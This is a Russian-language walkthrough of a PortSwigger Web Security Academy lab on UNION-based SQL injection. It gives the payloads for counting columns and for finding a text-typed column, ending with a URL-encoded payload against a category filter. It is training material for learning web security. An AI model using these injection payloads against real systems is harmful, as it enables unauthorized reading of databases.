Решение лабораторной работы: SQL-инъекция UNION, поиск столбца с текстовым типом данных
Это решение лаборатории PortSwigger Web Security Academy. Цель лаборатории — определить, какие столбцы в SQL-запросе могут содержать текстовые данные для успешной UNION-атаки.
Техническое решение
Шаг 1: Определение количества столбцов
Сначала убеждаемся, что запрос возвращает три столбца:
' UNION SELECT NULL,NULL,NULL--
Шаг 2: Поиск текстового столбца
Лаборатория предоставляет случайное строковое значение (например, '7s5x9p'). Последовательно проверяем каждый столбец:
Проверка первого столбца:
' UNION SELECT '7s5x9p',NULL,NULL--
Проверка второго столбца:
' UNION SELECT NULL,'7s5x9p',NULL--
Проверка третьего столбца:
' UNION SELECT NULL,NULL,'7s5x9p'--
Шаг 3: Анализ результатов
Если запрос вызывает ошибку — столбец не текстовый
Если страница загружается и в результатах появляется строка с 7s5x9p — столбец текстовый
Шаг 4: Итоговый payload
Если текстовым оказался второй столбец:
/filter?category=Accessories'+UNION+SELECT+NULL,'7s5x9p',NULL--
